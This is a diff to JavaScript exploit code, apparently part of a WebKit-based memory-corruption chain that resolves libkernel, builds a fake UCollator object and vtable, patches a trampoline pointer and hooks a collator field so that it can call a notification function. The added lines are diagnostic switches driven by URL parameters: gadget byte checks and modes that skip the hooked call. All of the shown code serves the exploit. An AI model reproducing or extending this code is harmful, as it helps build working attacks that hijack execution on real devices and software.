@@ -340,6 +340,25 @@ function resolveLibkernelFromGot(p, webkitBase, cfg, log) {
     return bases[0];
 }
 
+function verifyGdBytes(p, lk, gdRva, bump) {
+    let ok = true;
+    let hex = "";
+    try {
+        const addr = lk.add32(gdRva);
+        for (let i = 0; i < TRAMPOLINE_PATTERN.length; i++) {
+            const b = p.read1(addr.add32(i));
+            hex += (b & 0xff).toString(16).padStart(2, "0");
+            if (b !== TRAMPOLINE_PATTERN[i]) ok = false;
+        }
+    } catch (e) {
+        bump("NOTIFY-GD-BAD", "read fail @ 0x" + gdRva.toString(16));
+        return false;
+    }
+    bump(ok ? "NOTIFY-GD-OK" : "NOTIFY-GD-BAD",
+        "gd=0x" + gdRva.toString(16) + " bytes=" + hex);
+    return ok;
+}
+
 function findTrampolineRva(p, lk, knownRva, log, opts) {
     opts = opts || {};
     const allowScan = opts.gdScan === true;
@@ -542,6 +561,14 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
         vtableTarget = notifyEntry;
     }
 
+    if (params.get("notifygdcheck") === "1") {
+        verifyGdBytes(p, lk, gdRva, bump);
+        if (params.get("notifygdfire") === "0") {
+            bump("NOTIFY-S19", "gdcheck-only — no hook/fire");
+            return { result: -1, sent: false, ok: false, gdCheckOnly: true };
+        }
+    }
+
     bump("NOTIFY-S21", "patch fakeUC+0xe0");
     putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
     bump("NOTIFY-S22", "patch fakeVT+0x128 trampoline");
@@ -555,18 +582,31 @@ export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     const arg = pin.compareArg != null ? pin.compareArg
         : (pin.notificationRequest || "\x00");
 
-    if (params.get("notifybisect") === "1") {
+    const unhookedOnly = params.get("notifyunhooked") === "1";
+    const noCompare = params.get("notifynocompare") === "1";
+    let uPre = NaN;
+
+    if (params.get("notifybisect") === "1" || unhookedOnly) {
         bump("NOTIFY-S24u", "unhooked compareFn(" + argLabel + ", b)");
-        let uPre = NaN;
         try { uPre = pin.compareFn(arg, "b"); } catch (e) {
             bump("NOTIFY-S24u-FAIL", e && e.message ? e.message : String(e));
         }
         bump("NOTIFY-S24u-OK", "pre=" + uPre);
+        if (unhookedOnly) {
+            bump("NOTIFY-S19", "unhooked-only — skip hook/S25");
+            return { result: uPre, sent: false, ok: Number.isFinite(uPre), unhookedOnly: true };
+        }
     }
 
     bump("NOTIFY-S23", "hook collator → fakeUC");
     const collatorOriginal = hookCollatorField(
         p, pin, pin.fakeUCollatorAddr, carrier, bump);
+
+    if (noCompare) {
+        restoreCollatorField(p, pin, collatorOriginal, carrier);
+        bump("NOTIFY-S25-SKIP", "hook+restore only — no compareFn");
+        return { result: 0, sent: false, ok: true, noCompare: true };
+    }
 
     let notifyResult = NaN;
     let callError = null;
